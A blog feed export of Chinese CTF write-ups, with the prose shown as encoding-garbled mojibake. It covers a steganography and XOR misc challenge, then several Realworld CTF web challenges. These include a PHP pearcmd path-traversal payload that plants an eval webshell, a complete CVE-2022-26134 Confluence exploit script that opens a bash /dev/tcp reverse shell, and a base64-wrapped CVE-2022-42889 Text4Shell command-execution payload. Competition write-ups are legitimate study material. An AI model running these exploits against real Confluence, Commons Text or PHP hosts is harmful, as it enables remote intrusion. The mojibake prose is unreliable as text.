<p><img src="/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204031119995.png" alt="image-20230204031119995"></p>
<p>æ‰“å¼€Skredå‘ç°èŠå¤©è®°å½•</p>
<p><img src="/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204031253040.png" alt="image-20230204031253040"></p>
<p><img src="/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204031314258.png" alt="image-20230204031314258"></p>
<p><img src="/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204031344112.png" alt="image-20230204031344112"></p>
<p>å‘ç°èŠå¤©è®°å½•ä¼ è¾“äº†â½‚ä»¶ï¼Œæ ¹æ®skredçš„å­˜å‚¨æ–‡ä»¶çš„ä½ç½®ï¼Œå¯ä»¥ç›´æ¥å®šä½</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/data/</span>data<span class="regexp">/mobi.skred.app/</span>files/conversations</span><br></pre></td></tr></table></figure>
<p><img src="/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204032727182.png" alt="image-20230204032727182"></p>
<p>ä½¿â½¤adb pullæ¥æå–â½‚ä»¶</p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">adb pull /data/data/mobi.skred.app/files/conversations/9f817126-eabd-4c5c-<span class="number">9b47</span>-bebe04545ba0/<span class="number">50.</span>zip D:\æ¡Œé¢\CTF\è¥¿æ¹–è®ºå‰‘<span class="number">2023</span>\jntm-update\dasctf</span><br></pre></td></tr></table></figure>
<p>å…¶ä»–æ–‡ä»¶ç±»ä¼¼æ“ä½œæå–å³å¯</p>
<p>è§£å‹å‹ç¼©åŒ…å‘ç°å­˜åœ¨è§£å‹å¯†ç ï¼Œå¯èƒ½å­˜åœ¨ä¸¤å¼ å›¾ç‰‡é‡Œï¼Œå›¾ç‰‡å¯èƒ½é‡‡å–äº†éšå†™ä¹‹ç±»çš„éšè—ä¿¡æ¯çš„æ–¹å¼</p>
<p>ä½¿ç”¨stegsloveæ‰“å¼€45.pngï¼Œåœ¨Alpha planeå¤„å‘ç°ä¿¡æ¯ï¼Œå†™è„šæœ¬æå–å…¶äºŒè¿›åˆ¶ä¿¡æ¯</p>
<p><img src="/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204033851762.png" alt="image-20230204033851762"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&quot;45.png&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(img.width):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(img.height):</span><br><span class="line">        pixl = img.getpixel((m,n))</span><br><span class="line">        <span class="keyword">if</span>(pixl[<span class="number">3</span>] == <span class="number">255</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="number">1</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="number">0</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;_______________&quot;</span>) </span><br><span class="line"><span class="comment">#0110010100110000001100010011010100110100001101000110000100111001001100110011001100110011011001010110011000110110001100100110000100110011011000010110000100110010001101110011001100110101001101110110010101100010001101010011001001100101011000010011100001100001</span></span><br></pre></td></tr></table></figure>
<p>è¿›è¡Œç¼–ç è½¬æ¢ä¸€ä¸‹</p>
<p><img src="/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204034628556.png" alt="image-20230204034628556"></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">e01544a9333ef62a3aa27357eb52ea8a</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°è§£å‹å¯†ç ï¼Œè§£å‹50.zipï¼Œè·å¾—ä¸€ä¸ªflagæ–‡ä»¶ï¼Œè®°äº‹æœ¬æ‰“å¼€ä¸ºä¸€ä¸²ä¹±ç ï¼ŒçŒœæµ‹å¯èƒ½æ˜¯å•¥åŠ å¯†ï¼Œä¿¡æ¯åº”è¯¥åœ¨75.jpgä¸Šé¢</p>
<p><img src="/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204034838826.png" alt="image-20230204034838826"></p>
<p>æ ¹æ®èµ›æ–¹æ”¾å‡ºçš„hint3ï¼šåœ¨çº¿exif</p>
<p>è¯•ç€æŸ¥çœ‹ä¸€ä¸‹75.jpgçš„exifä¿¡æ¯ï¼Œè¿™é‡Œæˆ‘ä½¿ç”¨çš„æ˜¯<a href="https://exif.tuchong.com/">EXIFä¿¡æ¯æŸ¥çœ‹å™¨ (tuchong.com)</a></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">EXIFä¿¡æ¯æ‘˜è¦</span></span><br><span class="line"><span class="string">æ¨¡å¼</span>	<span class="string">æ›å…‰æ¨¡å¼:Aperture-priority</span> <span class="string">AE,</span> <span class="string">æµ‹å…‰æ¨¡å¼:Multi-segment,</span> <span class="string">æ›å…‰è¡¥å¿:0</span></span><br><span class="line"><span class="string">æ›å…‰</span>	<span class="string">å…‰åœˆ:4.0,</span> <span class="string">å¿«é—¨:1/250ç§’,</span> <span class="string">ISO200</span></span><br><span class="line"><span class="string">ç„¦è·</span>	<span class="number">50.0</span> <span class="string">mm</span> <span class="string">(35</span> <span class="attr">mm equivalent:</span> <span class="number">80.9</span> <span class="string">mm),</span> <span class="string">è§†è§’:25.1</span> <span class="string">deg</span></span><br><span class="line"><span class="string">è‰²å½©</span>	<span class="string">ç™½å¹³è¡¡:Auto,</span> <span class="string">è‰²å½©ç©ºé—´:sRGB</span></span><br><span class="line"><span class="string">File</span></span><br><span class="line"><span class="string">FileType</span>	<span class="string">JPEG</span></span><br><span class="line"><span class="string">FileTypeExtension</span>	<span class="string">jpg</span></span><br><span class="line"><span class="string">MIMEType</span>	<span class="string">image/jpeg</span></span><br><span class="line"><span class="string">ExifByteOrder</span>	<span class="string">Little-endian</span> <span class="string">(Intel,</span> <span class="string">II)</span></span><br><span class="line"><span class="string">ImageWidth</span>	<span class="number">3888</span></span><br><span class="line"><span class="string">ImageHeight</span>	<span class="number">2592</span></span><br><span class="line"><span class="string">EncodingProcess</span>	<span class="string">Baseline</span> <span class="string">DCT,</span> <span class="string">Huffman</span> <span class="string">coding</span></span><br><span class="line"><span class="string">BitsPerSample</span>	<span class="number">8</span></span><br><span class="line"><span class="string">ColorComponents</span>	<span class="number">3</span></span><br><span class="line"><span class="string">YCbCrSubSampling</span>	<span class="string">YCbCr4:2:2</span> <span class="string">(2</span> <span class="number">1</span><span class="string">)</span></span><br><span class="line"><span class="string">IFD0</span></span><br><span class="line"><span class="string">æ–¹å‘</span>	<span class="string">Horizontal</span> <span class="string">(normal)</span></span><br><span class="line"><span class="string">Xåˆ†è¾¨ç‡</span>	<span class="number">72</span></span><br><span class="line"><span class="string">Yåˆ†è¾¨ç‡</span>	<span class="number">72</span></span><br><span class="line"><span class="string">åˆ†è¾¨ç‡å•ä½</span>	<span class="string">inches</span></span><br><span class="line"><span class="string">YCbCrå®šä½</span>	<span class="string">Co-sited</span></span><br><span class="line"><span class="string">ExifIFD</span></span><br><span class="line"><span class="string">æ›å…‰æ—¶é—´</span>	<span class="number">1</span><span class="string">/250</span></span><br><span class="line"><span class="string">å…‰åœˆå€¼</span>	<span class="number">4.0</span></span><br><span class="line"><span class="string">æ›å…‰ç¨‹åº</span>	<span class="string">Aperture-priority</span> <span class="string">AE</span></span><br><span class="line"><span class="string">ISO</span>	<span class="number">200</span></span><br><span class="line"><span class="string">Exifç‰ˆæœ¬</span>	<span class="number">0221</span></span><br><span class="line"><span class="string">ComponentsConfiguration</span>	<span class="string">Y,</span> <span class="string">Cb,</span> <span class="string">Cr,</span> <span class="bullet">-</span></span><br><span class="line"><span class="string">å¿«é—¨é€Ÿåº¦å€¼</span>	<span class="number">1</span><span class="string">/250</span></span><br><span class="line"><span class="string">å…‰åœˆå€¼</span>	<span class="number">4.0</span></span><br><span class="line"><span class="string">æ›å…‰è¡¥å¿</span>	<span class="number">0</span></span><br><span class="line"><span class="string">æµ‹å…‰æ¨¡å¼</span>	<span class="string">Multi-segment</span></span><br><span class="line"><span class="string">é—ªå…‰ç¯</span>	<span class="string">Off,</span> <span class="string">Did</span> <span class="string">not</span> <span class="string">fire</span></span><br><span class="line"><span class="string">ç„¦è·</span>	<span class="number">50.0</span> <span class="string">mm</span></span><br><span class="line"><span class="string">ç”¨æˆ·æ³¨é‡Š</span>	<span class="string">XOR</span> <span class="string">DASCTF2022</span></span><br><span class="line"><span class="string">SubSecTime</span>	<span class="number">39</span></span><br><span class="line"><span class="string">SubSecTimeåŸå§‹</span>	<span class="number">39</span></span><br><span class="line"><span class="string">SubSecTimeæ•°ç åŒ–</span>	<span class="number">39</span></span><br><span class="line"><span class="string">Flashpixç‰ˆæœ¬</span>	<span class="number">0100</span></span><br><span class="line"><span class="string">è‰²å½©ç©ºé—´</span>	<span class="string">sRGB</span></span><br><span class="line"><span class="string">Exifå›¾åƒå®½åº¦</span>	<span class="number">3888</span></span><br><span class="line"><span class="string">Exifå›¾åƒé«˜åº¦</span>	<span class="number">2592</span></span><br><span class="line"><span class="string">ç„¦å¹³é¢Xè½´åˆ†è¾¨ç‡</span>	<span class="number">4438.356164</span></span><br><span class="line"><span class="string">ç„¦å¹³é¢Yè½´åˆ†è¾¨ç‡</span>	<span class="number">4445.969125</span></span><br><span class="line"><span class="string">ç„¦å¹³é¢åˆ†è¾¨ç‡å•ä½</span>	<span class="string">inches</span></span><br><span class="line"><span class="string">CustomRendered</span>	<span class="string">Normal</span></span><br><span class="line"><span class="string">æ›å…‰æ¨¡å¼</span>	<span class="string">Auto</span></span><br><span class="line"><span class="string">ç™½å¹³è¡¡</span>	<span class="string">Auto</span></span><br><span class="line"><span class="string">åœºæ™¯Captureç±»å‹</span>	<span class="string">Standard</span></span><br><span class="line"><span class="string">InteropIFD</span></span><br><span class="line"><span class="string">Interopç´¢å¼•</span>	<span class="string">R98</span> <span class="bullet">-</span> <span class="string">DCF</span> <span class="string">basic</span> <span class="string">file</span> <span class="string">(sRGB)</span></span><br><span class="line"><span class="string">Interopç‰ˆæœ¬</span>	<span class="number">0100</span></span><br><span class="line"><span class="string">IFD1</span></span><br><span class="line"><span class="string">å‹ç¼©</span>	<span class="string">JPEG</span> <span class="string">(old-style)</span></span><br><span class="line"><span class="string">Xåˆ†è¾¨ç‡</span>	<span class="number">72</span></span><br><span class="line"><span class="string">Yåˆ†è¾¨ç‡</span>	<span class="number">72</span></span><br><span class="line"><span class="string">åˆ†è¾¨ç‡å•ä½</span>	<span class="string">inches</span></span><br><span class="line"><span class="string">ç¼©ç•¥å›¾åç§»</span>	<span class="number">8412</span></span><br><span class="line"><span class="string">ç¼©ç•¥å›¾é•¿åº¦</span>	<span class="number">19629</span></span><br><span class="line"><span class="string">ThumbnailImage</span>	<span class="string">(Binary</span> <span class="string">data</span> <span class="number">19629</span> <span class="string">bytes,</span> <span class="string">use</span> <span class="string">-b</span> <span class="string">option</span> <span class="string">to</span> <span class="string">extract)</span></span><br><span class="line"><span class="string">Composite</span></span><br><span class="line"><span class="string">å…‰åœˆ</span>	<span class="number">4.0</span></span><br><span class="line"><span class="string">å›¾åƒå°ºå¯¸</span>	<span class="string">3888x2592</span></span><br><span class="line"><span class="string">Megapixels</span>	<span class="number">10.1</span></span><br><span class="line"><span class="string">35mmç­‰æ•ˆå› å­</span>	<span class="number">1.6</span></span><br><span class="line"><span class="string">å¿«é—¨é€Ÿåº¦</span>	<span class="number">1</span><span class="string">/250</span></span><br><span class="line"><span class="string">(æœ€å°)æ¨¡ç³Šåœˆ</span>	<span class="number">0.019</span> <span class="string">mm</span></span><br><span class="line"><span class="string">è§†è§’</span>	<span class="number">25.1</span> <span class="string">deg</span></span><br><span class="line"><span class="string">35mmç­‰æ•ˆç„¦è·</span>	<span class="number">50.0</span> <span class="string">mm</span> <span class="string">(35</span> <span class="attr">mm equivalent:</span> <span class="number">80.9</span> <span class="string">mm)</span></span><br><span class="line"><span class="string">è¶…ç„¦è·</span>	<span class="number">33.67</span> <span class="string">m</span></span><br><span class="line"><span class="string">äº®åº¦å€¼</span>	<span class="number">11.0</span></span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°ç”¨æˆ·æ³¨é‡Šä¸º<code>XOR DASCTF2022</code></p>
<p>å¯¹flagæ–‡ä»¶è¿›è¡ŒXOR</p>
<p><img src="/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204035735656.png" alt="image-20230204035735656"></p>
<p>è·å¾—flagï¼šDASCTF{fe089fecf73daa9dcba9bc385df54605}</p>
<h1 id="å†™åœ¨åé¢"><a class="markdownIt-Anchor" href="#å†™åœ¨åé¢"></a> #å†™åœ¨åé¢</h1>
<p>è¿™æ¬¡æ¯”èµ›å…¨ç¨‹æŠ•å…¥ï¼Œåšçš„å¾ˆç´¯ï¼Œä¸è¿‡æ”¶è·è¿˜æ˜¯å¾ˆå¤§çš„ï¼Œä¹Ÿå¾ˆé—æ†¾ï¼Œä¸€ä¸ªå­¦æ ¡åªèƒ½è¿›å…¥å†³èµ›ä¸€åªé˜Ÿä¼ï¼Œæƒ³å»çº¿ä¸‹å’Œå¾ˆå¤šå¸ˆå‚…è§é¢çš„ï¼Œè¿™æ¬¡æ˜¯æ²¡æœºä¼šå»æ­å·äº†ï¼Œä¸è¿‡èƒ½å»çº¿ä¸‹çš„æœºä¼šå¤šç€å‘¢ï¼ä¸æ€¥ï¼Œè®¤è¯†è›®ä¹…äº†ï¼Œå°±å·®çº¿ä¸‹ç…ç…äº†å“ˆå“ˆå“ˆå“ˆ</p>
]]></content>
      <categories>
        <category>èµ›äº‹Writeup</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Misc</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>ã€Realworldä½“éªŒèµ›ã€‘--Writeup</title>
    <url>/2023/01/Realworld%E4%BD%93%E9%AA%8C%E8%B5%9B-Writeup/</url>
    <content><![CDATA[<p>Realworld-CTFå¤ªäººæ€§åŒ–äº†ï¼ŒçŸ¥é“å›½é™…èµ›ä¸æ˜¯è°éƒ½èƒ½è§£é¢˜çš„ï¼Œç›´æ¥ä¸Šäº†ä¸€ä¸ªä½“éªŒèµ›ï¼ˆpsï¼š40%æ­£èµ›éš¾åº¦ï¼‰è®©æˆ‘è¿™ç§fwä¹Ÿæœ‰èƒ½ç©çš„åœ°æ–¹äº†ï¼ŒQEQã€‚æ²¡ç¯å¢ƒå¤ç°äº†ï¼Œå°±è´´ä¸€ä¸‹æ¯”èµ›å†™çš„ä¸æ˜¯å¾ˆè¯¦ç»†çš„wpã€‚ ï¼šï¼ˆ</p>
<span id="more"></span>
<h1 id="be-a-language-expert"><a class="markdownIt-Anchor" href="#be-a-language-expert"></a> Be-a-Language-Expert</h1>
<h2 id="è§£é¢˜è¿‡ç¨‹"><a class="markdownIt-Anchor" href="#è§£é¢˜è¿‡ç¨‹"></a> è§£é¢˜è¿‡ç¨‹</h2>
<p>åŸæœ¬çš„pocæ‰“çš„æ˜¯<code>/var/www/html/</code>è¿™ä¸ªè·¯å¾„ï¼Œè¿™é‡Œæ‰“ä¸äº†ï¼Œç›´æ¥æ‰“<code>/tmp/</code></p>
<p>POC</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">?lang=..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../u</span>sr<span class="regexp">/local/</span>lib<span class="regexp">/php/</span>pearcmd&amp;+config-create+<span class="regexp">/%/</span>&lt;?=@eval(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;TW&#x27;</span>]);?&gt;+<span class="regexp">/tmp/</span>TWe1v3.php</span><br></pre></td></tr></table></figure>
<p>è®¾ç½®Cookie</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">Cookie: think_lang=zh-cn..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../u</span>sr<span class="regexp">/local/</span>lib<span class="regexp">/php/</span>pearcmd</span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/Realworld%E4%BD%93%E9%AA%8C%E8%B5%9B-Writeup/1.png" alt="1"></p>
<p>èšå‰‘ç›´æ¥è¿ï¼š<a href="http://ip">http://ip</a>:port/index?lang=â€¦/â€¦/â€¦/â€¦/â€¦/â€¦/â€¦/â€¦/â€¦/â€¦/tmp/TWe1v3</p>
<p><code>shellï¼šTW</code></p>
<p><img src="/2023/01/Realworld%E4%BD%93%E9%AA%8C%E8%B5%9B-Writeup/2.png" alt="2"></p>
<p>è¿ä¸Šç›´æ¥<code>./readflag</code></p>
<h1 id="be-a-wiki-hacker"><a class="markdownIt-Anchor" href="#be-a-wiki-hacker"></a> Be-a-Wiki-Hacker</h1>
<h2 id="è§£é¢˜è¿‡ç¨‹-2"><a class="markdownIt-Anchor" href="#è§£é¢˜è¿‡ç¨‹-2"></a> è§£é¢˜è¿‡ç¨‹</h2>
<p><strong>CVE-2022-26134</strong>ç›´æ¥githubä¸Šæœexp</p>
<p>æ‰¾åˆ°å¼¹shellçš„exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="comment"># cve2022-26134</span></span><br><span class="line"><span class="comment"># by: lxxl</span></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"></span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">url</span>):</span><br><span class="line">    r = requests.get(url + <span class="string">&quot;/login.action&quot;</span>, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> (r.status_code == <span class="number">200</span>):</span><br><span class="line">        filter_version = re.findall(<span class="string">&quot;&lt;span id=&#x27;footer-build-information&#x27;&gt;.*&lt;/span&gt;&quot;</span>, r.text)</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">len</span>(filter_version) &gt;= <span class="number">1</span>):</span><br><span class="line">            version = filter_version[<span class="number">0</span>].split(<span class="string">&quot;&#x27;&gt;&quot;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;&lt;/&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">return</span> version</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> url</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">url, command</span>):</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;*/*&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.get(</span><br><span class="line">        url + <span class="string">&#x27;/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22&#x27;</span> + command + <span class="string">&#x27;%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/&#x27;</span>,</span><br><span class="line">        headers=headers, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> (r.status_code == <span class="number">302</span>):</span><br><span class="line">        <span class="keyword">return</span> r.headers[<span class="string">&#x27;X-Cmd-Response&#x27;</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shell</span>():</span><br><span class="line">        shell = ip + <span class="string">&quot;/&quot;</span> + port</span><br><span class="line">        shell1 = <span class="string">&quot;&#x27;bash&#x27;,&#x27;-c&#x27;,&#x27;bash -i &gt;&amp; &quot;</span></span><br><span class="line">        exp = shell1 + <span class="string">&quot;/dev/tcp/&quot;</span>  + shell + <span class="string">&quot; 0&gt;&amp;1&#x27;&quot;</span></span><br><span class="line">        payload1 = <span class="string">&#x27;&#x27;&#x27;$&#123;new javax.script.ScriptEngineManager().getEngineByName(&quot;nashorn&quot;).eval(&quot;new java.lang.ProcessBuilder().command(&#x27;&#x27;&#x27;</span></span><br><span class="line">        payload2 = exp + <span class="string">&#x27;&#x27;&#x27;).start()&quot;)&#125;/&#x27;&#x27;&#x27;</span></span><br><span class="line">        payloads = payload1 + payload2</span><br><span class="line">        s = urllib.parse.quote(payloads)</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;cve2022-26134&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--url&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;target url&#x27;</span>, required=<span class="literal">False</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--command&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;command&#x27;</span>, required=<span class="literal">False</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-i&#x27;</span>, <span class="string">&#x27;--lhost&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;type&#x27;</span>, required=<span class="literal">False</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--lport&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;type&#x27;</span>, required=<span class="literal">False</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    cmd = args.command</span><br><span class="line">    ip = args.lhost</span><br><span class="line">    port = args.lport</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">len</span>(sys.argv) &lt; <span class="number">3</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;USE: python3 &quot;</span> + sys.argv[<span class="number">0</span>] + <span class="string">&quot; -u https://target.com -c command&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ex: python3 &quot;</span> + sys.argv[<span class="number">0</span>] + <span class="string">&quot; -u https://target.com -i  your.ip -p your.port&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sys.argv[<span class="number">3</span>] == <span class="string">&quot;-i&quot;</span>):</span><br><span class="line">            target = args.url</span><br><span class="line">            ip = args.lhost</span><br><span class="line">            port = args.lport</span><br><span class="line">            e = requests.get(target + shell(), verify=<span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">if</span> e.status_code == <span class="number">200</span> <span class="keyword">or</span> e.status_code == <span class="number">302</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;[+] exploit success&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;[-] exploit failed&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        target = args.url</span><br><span class="line">        cmd = cmd.replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        version = check(target)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;============ GET Confluence Version ============&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> (version):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Version: &quot;</span> + version)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Version: Not Found&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(exploit(target, cmd))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/Realworld%E4%BD%93%E9%AA%8C%E8%B5%9B-Writeup/172033766-fff63d00-67ae-491b-8613-f8032cb2e27f.png" alt="3"></p>
<p>è‡ªå·±æœ¬æœºæˆ–è€…æœåŠ¡å™¨<code> nc -l xxxx</code> ç›‘å¬ä¸€ä¸‹ï¼Œè¿œç¨‹å¼¹ä¸ªshell</p>
<p><code>Cat /f* </code></p>
<p><img src="/2023/01/Realworld%E4%BD%93%E9%AA%8C%E8%B5%9B-Writeup/4.png" alt="4"></p>
<h1 id="apachecommandtext"><a class="markdownIt-Anchor" href="#apachecommandtext"></a> ApacheCommandText</h1>
<h2 id="è§£é¢˜è¿‡ç¨‹-3"><a class="markdownIt-Anchor" href="#è§£é¢˜è¿‡ç¨‹-3"></a> è§£é¢˜è¿‡ç¨‹</h2>
<p><strong>CVE-2022-42889</strong></p>
<p>javaè¡¨è¾¾å¼æ³¨å…¥æ¼æ´</p>
<p>ä¸€å¼€å§‹ç›´æ¥ç”¨CVEçš„POCæ˜¯ä¸å¯ä»¥çš„ï¼Œbanäº†<code>[script, file, url, dns]</code></p>
<p>åˆ©ç”¨base64Decoderç»•è¿‡é™åˆ¶</p>
<p>åˆ©ç”¨RCEè¯»å–æ‰¾flagçš„è·¯å¾„ä¸º<code>/readflag</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;$&#123;script:js:new java.util.Scanner(new java.lang.ProcessBuilder(&#x27;/bin/sh&#x27;,&#x27;-c&#x27;, &#x27;/readflag&#x27;).start().getInputStream(), &#x27;GBK&#x27;).useDelimiter(&#x27;zzc&#x27;).next()&#125;&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="string">&quot;$&#123;base64Decoder:&quot;</span> + Base64.getEncoder().encodeToString(poc.getBytes()) + <span class="string">&quot;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">$&#123;base<span class="number">64</span>Decoder:JHtzY<span class="number">3</span>JpcHQ<span class="number">6</span>a<span class="symbol">nM6</span>bmV<span class="number">3</span>IGphdmEudXRpbC<span class="number">5</span>TY<span class="number">2</span>FubmVyK<span class="name">G5</span>ldyBqYXZhLmxhbmcuUHJvY<span class="number">2</span>Vzc<span class="number">0</span>J<span class="number">1</span>aWxkZXIoJy<span class="number">9</span>iaW<span class="number">4</span><span class="attr">vc2</span>g<span class="symbol">nLCctYycsICcvcmVhZGZsYWcnKS5</span>zdGFydCgpLmdldElucHV<span class="number">0</span>U<span class="number">3</span>RyZWFtKCksICdHQks<span class="symbol">nKS51</span>c<span class="number">2</span>VEZWxpbWl<span class="number">0</span>ZXIoJ<span class="number">3</span>p<span class="number">6</span>YycpL<span class="name">m5</span>leHQoKX<span class="number">0</span>=&#125;</span><br></pre></td></tr></table></figure>
<h1 id="evil-mysql-server"><a class="markdownIt-Anchor" href="#evil-mysql-server"></a> Evil MySQL Server</h1>
<h2 id="è§£é¢˜è¿‡ç¨‹-4"><a class="markdownIt-Anchor" href="#è§£é¢˜è¿‡ç¨‹-4"></a> è§£é¢˜è¿‡ç¨‹</h2>
<p>åˆ©ç”¨æ¶æ„ mysql æœåŠ¡ç«¯æ¥è¯»å–æ–‡ä»¶</p>
